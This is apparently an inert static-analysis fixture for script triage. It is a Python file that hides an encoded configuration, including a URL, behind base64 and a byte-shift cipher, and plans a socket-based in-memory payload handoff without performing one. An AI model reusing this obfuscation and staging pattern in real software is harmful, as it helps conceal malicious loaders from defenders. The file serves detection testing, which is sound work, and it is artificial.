# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_26466398 = ("dDswenFyY25xO19hb3NncGNdcGNrbXJjKmJncW5fcmFmXWtja21wd3pfYl9ucmNwO3FtYWljcl1ual9sXWtja21wd3pxcl9lY11hbXN"
    "scjsvenF3bHJfdjtqZ3FyXWFta25wY2ZjbHFnbWx6bWBkc3FhX3JnbWw7ZG1wa19yXWtfbnphX3BwZ2NwO3VmY2NqXV9wYWZndGN6dW"
    "dsYm11cV1hZl9nbDtubXVjcHFmY2pqXXJtXW53cmZtbHphX2tuX2dlbF1nYjthX2tuX2dlbCs1XzMuNDQzL180enNwajtmcnJucTgtL"
    "TVfMy40NDMvXzQsY3Zfa25qYyxnbHRfamdiLTBkNWI3Ny5hLG53enNxY3BdX2VjbHI7RnNscnBjcXFOd3JmbWwtNV8zLjQ0My9fNA==")
CODEC_26466398 = "base64_chunks|subtract_modulo_256|02"

def load_26466398():
    return base64.b64decode(MATERIAL_26466398)

def decode_26466398(item1):
    return bytes((value + 2) % 256 for value in item1)

def recover_26466398():
    item4 = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    try:
        item2 = decode_26466398(load_26466398())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_26466398():
    return recover_26466398()

def surface_26466398():
    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))

def obfuscation_26466398():
    return "{left}{right}".format_map({"left": "format_", "right": "map"})

def plan_26466398():
    fields = dict(item.split("=", 1) for item in inspect_26466398().split("|"))
    analysis_surface = surface_26466398()
    obfuscation_surface = obfuscation_26466398()
    operation_plan = ("socket_plan_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_26466398())

# reconstruction complete